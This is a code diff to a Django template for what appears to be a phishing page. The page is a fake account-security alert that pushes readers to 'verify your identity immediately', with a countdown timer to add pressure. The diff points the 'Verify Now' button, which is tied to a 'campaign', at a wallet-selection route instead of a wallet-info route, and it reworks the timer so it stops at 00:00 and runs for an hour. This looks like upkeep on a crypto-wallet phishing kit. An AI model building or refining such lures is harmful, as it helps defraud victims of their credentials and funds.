@@ -115,19 +115,18 @@
 
         <p><strong>To prevent unauthorized access, please verify your identity immediately.</strong></p>
 
-        <a href="{% url 'core:wallet_info' campaign_id=campaign.id %}" class="verify-button">Verify Now</a>
+        <a href="{% url 'core:wallet_select' campaign_id=campaign.id %}" class="verify-button">Verify Now</a>
 
         <p style="color: #666; font-size: 14px; text-align: center;">If you did not attempt to login, please verify immediately to secure your account and prevent unauthorized access.</p>
     </div>
 
     <script>
-        // Set current date
-        document.getElementById('currentDate').textContent = new Date().toLocaleString();
-
         // Countdown timer
         function startTimer(duration, display) {
-            var timer = duration, minutes, seconds;
-            setInterval(function () {
+            var timer = duration;
+            var minutes, seconds;
+            
+            var countdown = setInterval(function () {
                 minutes = parseInt(timer / 60, 10);
                 seconds = parseInt(timer % 60, 10);
 
@@ -137,14 +136,16 @@
                 display.textContent = minutes + ":" + seconds;
 
                 if (--timer < 0) {
-                    timer = 0;
+                    clearInterval(countdown);
+                    display.textContent = "00:00";
+                    return;
                 }
             }, 1000);
         }
 
         window.onload = function () {
-            var thirtyMinutes = 60 * 30,
-            display = document.querySelector('#countdown');
+            var thirtyMinutes = 60 * 60; // 60 minutes in seconds
+            var display = document.querySelector('#countdown');
             startTimer(thirtyMinutes, display);
         };
     </script>
